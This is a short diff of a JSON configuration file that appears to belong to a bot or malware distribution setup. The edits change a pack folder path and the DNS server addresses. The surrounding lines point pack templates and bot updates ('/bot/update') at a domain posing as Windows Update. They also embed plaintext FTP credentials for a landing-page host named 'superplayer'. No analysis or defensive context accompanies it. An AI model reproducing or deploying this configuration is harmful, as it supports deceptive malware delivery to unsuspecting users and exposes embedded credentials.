@@ -19,7 +19,7 @@
     }
   ],
   "pack": {
-    "packFolder": "/root/hephaestus_data/default/server/packs",
+    "packFolder": "C:\\soft\\hephaestus_data\\default\\server\\packs",
     "packTemplateUrl": "http://windowsupdateservices.xyz/pack/envelope",
     "items": []
   },
@@ -33,8 +33,8 @@
   "landingAuto": true,
   "landingName": "superplayer",
   "landingFtp": "ftp://ftp:ftp123@tube-18.xyz/tube-18.xyz/",
-  "primaryDns": "84.200.33.53",
-  "secondaryDns": "84.200.33.53",
+  "primaryDns": "26.188.115.1",
+  "secondaryDns": "26.188.115.1",
   "extraUpdate": false,
   "updateUrl": "http://windowsupdateservices.xyz/bot/update",
   "track": true,
